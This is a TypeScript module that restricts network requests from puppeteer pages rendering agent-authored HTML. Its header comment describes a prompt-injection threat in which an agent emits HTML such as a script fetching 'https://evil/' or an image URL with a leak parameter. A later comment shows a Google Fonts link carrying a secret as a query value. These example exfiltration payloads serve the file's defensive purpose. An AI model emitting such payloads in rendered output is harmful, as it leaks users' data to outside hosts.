/**
 * Network guard for puppeteer pages rendering agent-authored HTML.
 *
 * The agent that composes a Maket document is semi-trusted: a prompt-injected
 * brief can produce HTML containing `<script>fetch('https://evil/')...</script>`
 * or an `<img src="https://evil/?leak=…">`. When that HTML is rendered to PDF
 * or screenshotted by puppeteer, every outbound request resolves through the
 * Chromium that runs as the local user — so the agent's exfiltration succeeds.
 *
 * `installNetworkGuard(page, mode)` neutralises this:
 *
 *  - `mode: "offline"` — only `data:`/`about:` URIs and a strict subset of
 *    Google Fonts CDN requests succeed. Use for paths that inline their assets
 *    (PDF, thumbnail) but still need charte-declared web fonts so measured
 *    metrics match the live preview. Misnamed historically — it's "offline
 *    except inert font CDN", not strictly offline.
 *  - `mode: "localhost-only"` — same as offline, plus requests to `127.0.0.1`
 *    or `localhost`. Use for paths that legitimately fetch from the Maket
 *    HTTP server (layout check, preview snapshot).
 *
 * Google Fonts is allowed in both modes because `charteFontImport` emits
 * `@import url('https://fonts.googleapis.com/...')` for every charte-declared
 * family. Blocking the CDN made headless renders fall back to
 * `serif`/`sans-serif`/`monospace` — the layout check then measured with the
 * wrong metrics and returned "Layout OK" on pages that overflowed in the
 * user's browser. Allowing only known-good font endpoints keeps that benefit
 * without widening the exfiltration surface — see `isAllowedFontRequest`.
 */

import type { HTTPRequest } from "puppeteer";
import type { NetworkGuardMode, RenderPage } from "../services/browser-pool.js";

export type { NetworkGuardMode } from "../services/browser-pool.js";

const LOCAL_HOSTNAMES = new Set(["localhost", "127.0.0.1", "::1"]);

// Path + query allowlist for Google Fonts. Without these, an agent-authored
// `<link href="https://fonts.googleapis.com/css2?family=Inter&leak={{secret}}">`
// would round-trip through Google's access logs — narrow exfil vector but
// real, since the hostname check alone admits any URL.
const GOOGLEAPIS_PATHS = new Set(["/css", "/css2"]);
const GOOGLEAPIS_QUERY_KEYS = new Set([
	"family",
	"display",
	"subset",
	"text",
	"effect",
]);

function isAllowedFontRequest(u: URL, hostname: string): boolean {
	if (hostname === "fonts.googleapis.com") {
		if (!GOOGLEAPIS_PATHS.has(u.pathname)) return false;
		for (const key of u.searchParams.keys()) {
			if (!GOOGLEAPIS_QUERY_KEYS.has(key)) return false;
		}
		return true;
	}
	if (hostname === "fonts.gstatic.com") {
		if (!u.pathname.startsWith("/s/")) return false;
		if (u.search !== "") return false;
		return true;
	}
	return false;
}

export function isAllowedRenderRequest(
	rawUrl: string,
	mode: NetworkGuardMode,
): boolean {
	if (rawUrl.startsWith("data:") || rawUrl.startsWith("about:")) return true;
	try {
		const u = new URL(rawUrl);
		if (u.protocol !== "http:" && u.protocol !== "https:") return false;
		const hostname = u.hostname.toLowerCase();
		if (isAllowedFontRequest(u, hostname)) return true;
		return mode === "localhost-only" && LOCAL_HOSTNAMES.has(hostname);
	} catch {
		return false;
	}
}

export async function installNetworkGuard(
	page: RenderPage,
	mode: NetworkGuardMode,
): Promise<void> {
	if (page.setNetworkGuard) {
		await page.setNetworkGuard(mode);
		return;
	}
	const puppeteerPage = page as unknown as import("puppeteer").Page;
	await puppeteerPage.setRequestInterception(true);
	puppeteerPage.on("request", (req) => {
		handleGuardedRequest(req, mode);
	});
}

// code-moniker: ignore[maket-ownership-keeps-behavior-with-its-owner]
// Request allow/deny policy for headless pages; coordinates URL checks and puppeteer request API.
function handleGuardedRequest(req: HTTPRequest, mode: NetworkGuardMode): void {
	const url = req.url();
	if (isAllowedRenderRequest(url, mode)) {
		req.continue().catch(() => {});
		return;
	}
	req.abort("blockedbyclient").catch(() => {});
}
